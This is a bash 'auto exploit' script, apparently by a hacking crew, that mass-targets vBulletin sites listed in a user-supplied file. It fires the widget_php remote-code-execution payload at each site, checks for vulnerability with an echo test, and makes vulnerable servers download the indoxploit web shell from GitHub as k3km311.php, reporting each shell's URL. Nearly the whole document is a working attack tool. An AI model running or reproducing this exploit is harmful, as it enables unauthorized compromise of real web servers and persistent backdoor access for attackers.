#!/bin/bash
# auto exploit 
# zsecc0de-crew-id ~ widhisec
GREEN=$(tput setaf 2) #HIJAU
WHITE=$(tput setaf 7) #PUTIH
CYAN=$(tput setaf 6)
RED=$(tput setaf 1) #MERAH
NORMAL=$(tput sgr0)
LIMITATOR=15
function banner(){
	echo -e "
[===============================] 
 ___________
< vBulletin >
 -----------
 \     
  \            -> ${CYAN}(c) zsecc0de-crew-id
   \ >()_
      (__)__ _ $RED
[===============================]
	"
}
function Kerak(){
	en=$(echo $x | sed -f urlencode)
	chekweb=$(curl --silent "http://tools.seobook.com/server-header-checker/?url=$en&useragent=8&protocol=11" |  grep -c "HTTP/1.1 200 OK")
	}
function bababa(){ 
	Kerak;
	if [[ $chekweb =~ "1" ]]; then
        gassx=$(curl -kL --silent "${x}" --request POST --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('curl -s https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/shell-v3.php' -o k3km311.php);" --output /dev/null -w "%{http_code}" )
            gase=$(curl -kL --silent "${x}" --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('echo wiwi');")
             grab=$(echo "$gase"| sed 's/\\r//g' | 
                sed 's/\\t//g' | 
                        sed 's/\\n//g' | 
                            sed 's/\\//g' | 
                                    grep -Po 'class="widget-header-divider" />\K.*?<' | 
                    tr -d '<')
         
    if [[ $gase =~ "wiwi" ]]; then
        	  printf "${WHITE}[${GREEN}VULN${GREEN}]${WHITE} ~ $x\n"	  
        	  echo -e "${WHITE}[${GREEN}MENCOBA UPLOAD..${GREEN}]${WHITE} ~"
     fi
           if [[ $gassx =~ "500" ]]; then
        	  printf "BERHASIL -> $x/k3km311.php\n"
      else
        	  printf "${WHITE}[${RED}NOTT VULN]${WHITE} ~ $x\n"
        	fi
       fi
rm -rf nj Web
}
banner
echo -ne ${NORMAL}"list > "; read lst
if [[ ! -e $lst ]]; then
	printf "^file kosong .\n"
	exit 
fi
(
for x in $(cat ${lst}); do
	 ((thread=thread%LIMITATOR)); ((thread++==0)) && wait
     bababa &
done
wait
)